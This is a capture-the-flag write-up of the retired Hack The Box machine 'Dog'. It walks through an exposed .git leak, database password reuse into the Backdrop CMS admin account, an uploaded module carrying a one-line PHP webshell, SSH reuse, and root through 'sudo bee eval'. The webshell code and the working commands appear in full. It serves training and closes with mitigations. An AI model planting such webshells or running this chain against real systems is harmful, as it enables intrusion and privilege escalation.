# Dog — Hack The Box write-up

> **Platform:** Hack The Box · **Difficulty:** Easy · **OS:** Linux · Retired.
> Target handed over as an IP only (`10.129.231.223`); the name "Dog" came from
> the site title and the `dog.htb` vhost mid-run, not from the operator.
> Flags redacted.

## Overview

Dog is a straight-line Linux web box with a clean lesson in each phase: an
exposed `.git/` leaks the source and a database password, that password is reused
all the way up, a CMS turns its admin role into code execution through its own
module installer, and a careless `sudo` rule hands over root. No exploit
development, no CVE binary — just finding the secrets that were left lying around
and reusing them.

## Recon

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

Two ports, so the path is in one of them, and SSH without a credential is not a
path. Port 80 is **Backdrop CMS 1.27.1** — the `X-Generator` header announces it,
and `core/includes/bootstrap.inc` (recovered later) pins the exact version.
Backdrop is a fork of Drupal 7; it keeps Drupal's `?q=` routing and its
module/theme model.

## The `.git/` leak

A reflex check on any web root paid off immediately:

```
$ curl -s http://10.129.231.223/.git/config
[core]
	repositoryformatversion = 0
	...
```

The working tree had been deployed straight into the web root with its `.git`
directory intact. `git-dumper` reconstructed all 2873 files. Two things fell out
at once:

- The commit metadata named the virtual host and a user:
  `root <dog@dog.htb> ... commit (initial): todo: customize url aliases`.
  Added `dog.htb` to `/etc/hosts`.
- `settings.php` held the database connection string in cleartext:

  ```php
  $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
  ```

MySQL only listens on localhost, so the password itself is not directly usable —
but a password is a password. Grepping the dump for an identity turned up one
account: `tiffany@dog.htb`.

## Foothold: credential reuse → admin → module-upload RCE

The database password was reused for the CMS administrator. The one snag worth
recording: Backdrop serves anonymous pages from a cache, so the login form's
`form_build_id` is stale and the form silently refuses to process. Two details
fix it — bust the cache (`&cb=$RANDOM`) to get a fresh `form_build_id`, and use
the correct `form_id`, which is **`user_login`** (not `user_login_form`). With
those:

```
tiffany : BackDropJ2024DS2024  →  302 /?q=admin/dashboard
```

A Backdrop administrator can install modules, and a module is just PHP, so the
admin role *is* code execution. The intended delivery is the manual installer at
`/?q=admin/installer/manual`, which takes an uploaded archive. A minimal module —
a `.info` descriptor plus a one-line webshell —

```
shell/shell.info     type = module / name = shell / backdrop = 1.x ...
shell/shell.php      <?php if(isset($_REQUEST['c'])) system($_REQUEST['c']);
```

packaged as `shell.tar.gz` and uploaded, extracts under the web root. The install
batch itself reports an error (the module never enables), but extraction already
happened — the file is served regardless:

```
$ curl 'http://dog.htb/modules/shell/shell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> Note on driving the install: the upload redirects to `core/authorize.php`,
> whose work runs as an AJAX batch. Hitting `authorize.php?...&op=do_nojs` a few
> times drives it to completion before the webshell appears.

## User: password reuse again

`/home` holds `jobert` and `johncusack`; `user.txt` lives in `johncusack`'s home,
owned `root:johncusack 0640`, so `www-data` can't read it. The same password that
has opened every door so far opens one more:

```
johncusack : BackDropJ2024DS2024  →  SSH
```

`user.txt` read. (`jobert` rejected the same password — reuse is common, not
universal; spray one password per account and move on.)

## Root: `sudo bee`

```
$ sudo -l
User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

`bee` is Backdrop's command-line tool — the Drupal `drush` equivalent — and like
drush it has an `eval` sub-command that runs arbitrary PHP once it has
bootstrapped the site. It must be run from the site directory so it can find the
install:

```
$ cd /var/www/html
$ sudo /usr/local/bin/bee eval 'system("id; cat /root/root.txt");'
uid=0(root) gid=0(root) groups=0(root)
<root flag>
```

Root.

## Leads that didn't pan out

- **MySQL root password over SSH / as `tiffany`** — failed; the password only
  became a *login* credential at the `johncusack` account, not for tiffany or
  jobert as a system user.
- **`jobert`** has `.sudo_as_admin_successful` and looked like the intended user,
  but the reused password didn't work for it — `johncusack` was the way in.

## What would have stopped it

Block `.git/` at the web server. Everything downstream — the DB password, the
admin login, the RCE, the reused SSH password — hangs off that one exposed
directory. And independently, never put a general-purpose site CLI like `bee`
behind a blanket `sudo` rule: `bee eval` is just "run PHP as root" with extra
steps.

## Chain, one line each

1. Exposed `/.git/` → dump source with git-dumper
2. `settings.php` → cleartext MySQL password
3. Reuse password → Backdrop admin (`form_id=user_login`, cache-bust the form)
4. Admin → upload malicious module → RCE as www-data
5. Reuse password → SSH as johncusack → user.txt
6. `sudo bee eval 'system(...)'` → root
